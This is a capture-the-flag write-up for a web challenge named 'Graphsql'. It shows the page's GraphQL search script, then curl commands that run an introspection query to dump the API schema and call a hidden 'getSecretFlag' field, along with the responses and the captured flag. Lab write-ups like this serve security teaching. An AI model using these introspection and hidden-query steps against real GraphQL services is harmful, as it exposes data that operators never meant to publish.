# Graphsql
300 Points
### Description

a powerful GraphQL search functionality

### Soulution

looking at the script on the web for the GraphQL see a function searchProducts() that can get us only a few attributes of the product.

```html
<script>
  async function searchProducts() {
    const keyword = document.getElementById("searchInput").value;
    const query =
      query {
        searchProducts(keyword: "${keyword}") {
          id
          name
          price
        }
      }
    ;

    const response = await fetch("/graphql", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ query }),
    });

    const result = await response.json();
    const resultsList = document.getElementById("results");
    resultsList.innerHTML = "";

    if (result.data && result.data.searchProducts.length > 0) {
      result.data.searchProducts.forEach(product => {
        const li = document.createElement("li");
        li.textContent = ${product.name} - $${product.price};
        resultsList.appendChild(li);
      });
    } else {
      resultsList.innerHTML = "<li>No results found.</li>";
    }
  }
</script>
```

So using a payload to get all the schmema of the GraphQL API

```bash
curl -X POST "https://yfgrkspxvh-ctf.cybersecuritychallenge.al/graphql" \
     -H "Content-Type: application/json" \
     -d '{"query":"{ __schema { types { name fields { name } } } }"}'
```

output:

```JSON
{
    "data": {
        "__schema": {
            "types": [{
                "name": "Product",
                "fields": [{
                    "name": "id"
                }, {
                    "name": "name"
                }, {
                    "name": "price"
                }]
            }, {
                "name": "ID",
                "fields": null
            }, {
                "name": "String",
                "fields": null
            }, {
                "name": "Float",
                "fields": null
            }, {
                "name": "Query",
                "fields": [{
                    "name": "searchProducts"
                }, {
                    "name": "getSecretFlag"
                }]
            }
        // the rest of the code
        ]
        }
    }
}
```

We see that we have more than one function we can call getSecretFlag()

```bash
curl -X POST "https://yfgrkspxvh-ctf.cybersecuritychallenge.al/graphql" \
     -H "Content-Type: application/json" \
     -d '{"query":"{ getSecretFlag }"}'
```

output:

```JSON
{
    "data": {
        "getSecretFlag": "CSC25{h1dd3n_gr4phq1_fl4g}"
    }
}
```

flag: `CSC25{h1dd3n_gr4phq1_fl4g}`
